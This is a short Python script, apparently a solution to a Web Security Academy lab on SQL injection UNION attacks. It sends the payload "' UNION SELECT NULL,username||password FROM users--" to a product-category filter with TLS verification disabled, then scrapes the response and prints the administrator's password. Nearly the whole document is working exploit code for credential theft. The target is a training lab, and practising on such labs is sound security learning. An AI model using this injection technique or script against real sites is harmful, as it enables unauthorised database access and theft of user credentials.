# SQL injection UNION attack, retrieving multiple values in a single column

import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def lancer_exploit(url):
    url_final=url+"filter?category=Gifts"
    payload="' UNION SELECT NULL,username||password FROM users--"
    
    try:
        reponse_exploit=requests.get(url_final+payload,verify=False)
        soup_reponse_exploit=BeautifulSoup(reponse_exploit.text,'html.parser').find_all('tr')
        admin_info=[thligne.get_text() for thligne in soup_reponse_exploit if "administrator" in thligne.get_text()]
        admin_password=admin_info[0].split('administrator',1)[1]
        print(admin_password)
    except requests.exceptions.RequestException as mon_exception:
        print(f"Erreur : {mon_exception}")


lancer_exploit("https://0a4a009e047c29bb8697907700f400f1.web-security-academy.net/")